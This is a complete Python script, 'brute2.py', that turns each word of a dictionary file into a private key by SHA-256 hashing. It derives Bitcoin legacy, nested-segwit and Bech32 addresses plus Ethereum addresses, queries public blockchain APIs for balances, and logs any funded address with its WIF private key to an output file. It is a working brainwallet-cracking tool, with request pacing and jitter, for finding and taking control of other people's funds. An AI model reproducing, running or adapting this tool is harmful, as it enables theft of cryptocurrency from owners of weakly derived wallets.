#!/usr/bin/env python3
"""
brute2.py
Sequential brute scanner for BTC (legacy P2PKH, nested segwit P2SH, native segwit Bech32)
PLUS Ethereum checks by default. Exact sleep (seconds) is applied per address check.

Dependencies:
    pip3 install coincurve requests base58 pycryptodome bech32

Usage:
    python3 brute2.py --dict dictionary.txt --out found.txt [--no-eth] [--sleep 0.6] [--debug]
"""
from __future__ import annotations
import argparse, io, sys, time, logging, hashlib, binascii, random
import requests, base58
from coincurve import PrivateKey

# optional imports
try:
    from Crypto.Hash import keccak
except Exception:
    keccak = None

# try to import bech32 functions from common bech32 package
try:
    # many bech32 packages expose bech32_encode and convertbits
    from bech32 import bech32_encode, convertbits
    _HAS_BECH32 = True
except Exception:
    _HAS_BECH32 = False

# ---------------- crypto helpers ----------------
def sha256(b: bytes) -> bytes:
    return hashlib.sha256(b).digest()

def hash160(b: bytes) -> bytes:
    return hashlib.new('ripemd160', hashlib.sha256(b).digest()).digest()

def base58check(prefix: bytes, payload: bytes) -> str:
    raw = prefix + payload
    chk = sha256(sha256(raw))[:4]
    return base58.b58encode(raw + chk).decode()

def privhex_from_passphrase(word: str) -> str:
    return sha256(word.encode('utf-8')).hex()

def wif_from_privhex(priv_hex: str, compressed: bool = True) -> str:
    b = bytes.fromhex(priv_hex)
    payload = b'\x80' + b + (b'\x01' if compressed else b'')
    chk = sha256(sha256(payload))[:4]
    return base58.b58encode(payload + chk).decode()

# ---------------- BTC address derivations ----------------
def btc_p2pkh(pub_bytes: bytes) -> str:
    """Legacy 1..."""
    return base58check(b'\x00', hash160(pub_bytes))

def btc_p2sh_p2wpkh(pub_bytes: bytes) -> str:
    """Nested segwit 3... (P2SH of P2WPKH redeemscript)"""
    redeem_script = b'\x00\x14' + hash160(pub_bytes)  # OP_0 + push20(pubhash)
    return base58check(b'\x05', hash160(redeem_script))

def btc_bech32(pub_bytes: bytes) -> str:
    """Native segwit bc1q... using bech32.convertbits + bech32_encode"""
    if not _HAS_BECH32:
        raise RuntimeError("bech32 library not available (pip install bech32)")
    # witness program is HASH160(pub) for a P2WPKH (version 0, 20 bytes)
    witprog = hash160(pub_bytes)
    # convert from 8-bit to 5-bit groups
    data = convertbits(witprog, 8, 5, True)
    if data is None:
        raise RuntimeError("bech32.convertbits failed")
    # prepend witness version 0
    data5 = [0] + data
    addr = bech32_encode("bc", data5)
    return addr

# ---------------- Ethereum helpers ----------------
def _keccak_256(data: bytes) -> bytes:
    if keccak is None:
        raise RuntimeError("pycryptodome required for keccak (pip install pycryptodome)")
    k = keccak.new(digest_bits=256)
    k.update(data)
    return k.digest()

def to_checksum_address(addr_hex_lower: str) -> str:
    if len(addr_hex_lower) != 40:
        raise ValueError("Invalid address length for checksum")
    addr_lower = addr_hex_lower.lower()
    h = _keccak_256(addr_lower.encode('ascii')).hex()
    out = []
    for i, c in enumerate(addr_lower):
        if c in '0123456789':
            out.append(c)
        else:
            out.append(c.upper() if int(h[i], 16) >= 8 else c)
    return ''.join(out)

def eth_address_from_privhex(priv_hex: str) -> str:
    """Return 0x + EIP-55 checksummed address"""
    priv_bytes = bytes.fromhex(priv_hex)
    pk = PrivateKey(priv_bytes)
    pub_uncompressed = pk.public_key.format(compressed=False)  # 65 bytes, 0x04 prefix
    pub_no_prefix = pub_uncompressed[1:]
    digest = _keccak_256(pub_no_prefix)
    addr_bytes = digest[-20:]
    addr_hex = addr_bytes.hex()
    return "0x" + to_checksum_address(addr_hex)

# ---------------- generic numeric fetcher ----------------
def _get_raw_numeric(session: requests.Session, url: str, timeout: float = 15.0) -> float:
    r = session.get(url, timeout=timeout)
    r.raise_for_status()
    text = r.text.strip()
    # try direct float
    try:
        return float(text)
    except Exception:
        pass
    # try JSON fields
    try:
        j = r.json()
        for key in ("total_received","totalReceived","final_balance","finalBalance","balance","received","result"):
            if isinstance(j, dict) and key in j:
                try:
                    return float(j[key])
                except Exception:
                    try:
                        return float(str(j[key]))
                    except Exception:
                        pass
    except Exception:
        pass
    # if nothing parsed, return 0.0 (no funds) instead of raising to be resilient
    return 0.0

# ---------------- helpers to print/write ----------------
def print_used_btc(word, label, addr, wif, raw_value, fout):
    print("\n=== USED BTC WALLET FOUND ===")
    print(f"WORD: {word}")
    print(f"TYPE: {label}")
    print(f"ADDRESS: {addr}")
    print(f"WIF: {wif}")
    print(f"VALUE RAW: {raw_value}")
    print("============================\n")
    fout.write(f"{word},BTC,{label},{addr},{wif},{raw_value}\n")
    fout.flush()

def print_used_eth(word, eth_addr, raw_wei, fout):
    print("\n=== USED ETH WALLET FOUND ===")
    print(f"WORD: {word}")
    print(f"ETH ADDRESS: {eth_addr}")
    print(f"BALANCE RAW (wei): {raw_wei}")
    print("===========================\n")
    fout.write(f"{word},ETH,,{eth_addr},,{raw_wei}\n")
    fout.flush()

# ---------------- main loop ----------------
def main():
    ap = argparse.ArgumentParser(description="Brute sequential scanner: BTC (1,3,bc1q) + ETH (default on).")
    ap.add_argument("--dict", "-d", default="dictionary.txt", help="wordlist (one passphrase per line)")
    ap.add_argument("--out", "-o", default="found.txt", help="append CSV output")
    ap.add_argument("--sleep", type=float, default=0.6, help="seconds to sleep per address check (default 0.6)")
    ap.add_argument("--jitter", type=float, default=0.0, help="optional extra jitter added to sleep (default 0.0)")
    ap.add_argument("--debug", action="store_true", help="debug logging")
    # ETH default on; provide a --no-eth to disable
    ap.add_argument("--no-eth", dest="eth", action="store_false", help="disable Ethereum checks (ETH checks are ON by default)")
    ap.set_defaults(eth=True)
    # endpoints (change if you prefer other backends)
    ap.add_argument("--base-received", default="https://blockchain.info/q/getreceivedbyaddress")
    ap.add_argument("--base-balance", default="https://blockchain.info/q/addressbalance")
    ap.add_argument("--base-eth-balance", default="https://api.blockcypher.com/v1/eth/main/addrs")
    args = ap.parse_args()

    logging.basicConfig(level=logging.DEBUG if args.debug else logging.INFO, format="%(asctime)s %(levelname)s %(message)s")

    # dependency checks
    try:
        _ = PrivateKey(b'\x01' * 32)
    except Exception as e:
        logging.error("coincurve missing or failing: %s", e)
        sys.exit(1)
    if args.eth and keccak is None:
        logging.error("ETH checks enabled but Crypto.Hash.keccak (pycryptodome) not found. Install: pip install pycryptodome")
        sys.exit(1)
    if not _HAS_BECH32:
        logging.warning("bech32 library not found; bc1q address generation will be skipped. Install: pip install bech32")

    # open files
    try:
        fdict = io.open(args.dict, "rt", encoding="utf-8", errors="ignore")
    except Exception as e:
        logging.error("Cannot open dictionary: %s", e)
        sys.exit(1)
    try:
        fout = open(args.out, "a", encoding="utf-8", buffering=1)
    except Exception as e:
        logging.error("Cannot open output file: %s", e)
        sys.exit(1)

    session = requests.Session()
    total = checked = found = 0
    start_time = time.time()

    try:
        for raw in fdict:
            word = raw.strip()
            if not word:
                continue
            total += 1

            # derive private key / pubkey / wif
            try:
                priv_hex = privhex_from_passphrase(word)
                pk = PrivateKey(bytes.fromhex(priv_hex))
                pub_compressed = pk.public_key.format(compressed=True)
                wif = wif_from_privhex(priv_hex, compressed=True)
            except Exception as e:
                logging.debug("Derivation failed for '%s': %s", word, e)
                continue

            # prepare BTC address list
            btc_addresses = [
                ("P2PKH", btc_p2pkh(pub_compressed)),
                ("P2SH-P2WPKH", btc_p2sh_p2wpkh(pub_compressed))
            ]
            if _HAS_BECH32:
                try:
                    btc_addresses.append(("Bech32", btc_bech32(pub_compressed)))
                except Exception as e:
                    logging.debug("Bech32 derivation error: %s", e)

            # check each BTC address (per-address sleep enforced)
            for label, addr in btc_addresses:
                checked += 1
                # first try getreceivedbyaddress
                try:
                    url = f"{args.base_received}/{addr}"
                    val = _get_raw_numeric(session, url, timeout=20.0)
                    if val > 0:
                        logging.info("Found used BTC address (received) %s %s", label, addr)
                        print_used_btc(word, label, addr, wif, val, fout)
                        found += 1
                    else:
                        url2 = f"{args.base_balance}/{addr}"
                        val2 = _get_raw_numeric(session, url2, timeout=20.0)
                        if val2 > 0:
                            logging.info("Found used BTC address (balance) %s %s", label, addr)
                            print_used_btc(word, label, addr, wif, val2, fout)
                            found += 1
                except Exception as e:
                    logging.debug("BTC check error for %s (%s): %s", addr, label, e)

                # sleep exactly args.sleep plus optional jitter
                sleep_time = args.sleep + (random.random() * args.jitter if args.jitter > 0 else 0.0)
                time.sleep(sleep_time)

            # ETH check (per address sleep after ETH call)
            if args.eth:
                try:
                    eth_addr = eth_address_from_privhex(priv_hex)
                    # BlockCypher style: /v1/eth/main/addrs/{addr}/balance
                    url = f"{args.base_eth_balance}/{eth_addr}/balance"
                    eth_val = _get_raw_numeric(session, url, timeout=20.0)
                    if eth_val > 0:
                        logging.info("Found used ETH address %s", eth_addr)
                        print_used_eth(word, eth_addr, eth_val, fout)
                        found += 1
                except Exception as e:
                    logging.debug("ETH check error: %s", e)

                # sleep exactly args.sleep plus optional jitter
                sleep_time = args.sleep + (random.random() * args.jitter if args.jitter > 0 else 0.0)
                time.sleep(sleep_time)

            # periodic logging
            if total % 1000 == 0:
                elapsed = time.time() - start_time
                logging.info("Processed %d words — checked:%d found:%d — avg %.2f words/s", total, checked, found, total / max(1.0, elapsed))

    except KeyboardInterrupt:
        logging.info("Interrupted by user")

    finally:
        session.close()
        fdict.close()
        fout.close()
        elapsed = time.time() - start_time
        logging.info("Finished. Total read: %d, checked:%d found:%d, elapsed %.1fs", total, checked, found, elapsed)

if __name__ == "__main__":
    main()